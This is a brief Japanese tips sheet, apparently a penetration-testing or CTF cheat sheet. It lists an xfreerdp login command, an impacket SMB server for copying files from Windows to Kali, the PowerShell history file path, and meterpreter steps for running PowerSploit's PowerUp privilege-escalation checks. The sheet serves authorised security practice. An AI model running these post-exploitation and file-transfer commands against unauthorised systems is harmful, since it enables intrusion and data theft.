# Tips

## リモートデスクトップ接続

```shell
xfreerdp /u:<user> /p:<password> /v:<ip> /w:1280 /h:800
```

## ファイル共有

Linux の共有フォルダに、Windows からアクセスする

```shell
python3 -m pipx install impacket
```

```shell
# kali側で共有設定。user,passwordはWindows側の認証情報。
$ mkdir share
$ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <user> -password <password> public share

# Windows側からコピー
copy <file> \\<ip>\public\
```

## Powershell

### Powershell の履歴

```powershell
%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Powershell プロセスのログ

```text
Application and Services Logs -> Microsoft -> Windows -> PowerShell -> OperationalApplication and Service Logs -> Windows PowerShell
```

### meterpreter から Powershell の起動

（例）
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

```shell
meterpreter > load powershell
meterpreter > posershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```
